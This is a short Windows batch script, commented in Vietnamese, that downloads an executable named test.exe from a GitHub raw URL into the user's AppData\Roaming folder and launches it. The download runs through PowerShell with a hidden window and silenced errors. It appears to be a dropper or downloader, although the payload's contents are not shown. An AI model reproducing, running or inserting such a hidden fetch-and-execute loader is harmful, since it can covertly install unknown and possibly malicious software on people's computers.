@echo off
setlocal

set "file=test.exe"
set "url=https://github.com/rspvn/a/raw/main/test.exe"
set "folder=%USERPROFILE%\AppData\Roaming\test"

:: Tạo thư mục nếu chưa tồn tại
if not exist "%folder%" (
    mkdir "%folder%"
)

:: Kiểm tra nếu tệp đã tồn tại và khởi chạy
if exist "%folder%\%file%" (
    start "" "%folder%\%file%"
    exit /b
) else (
    echo Đang tải tệp...
    powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%folder%\%file%' -ErrorAction SilentlyContinue"

    :: Kiểm tra xem tệp đã tải xong chưa
    if exist "%folder%\%file%" (
        start "" "%folder%\%file%"
    ) else (
        echo Tải tệp thất bại.
    )
    
    :: Đóng cửa sổ CMD sau 5 giây
    timeout /t 5 /nobreak >nul
    exit /b
)

endlocal
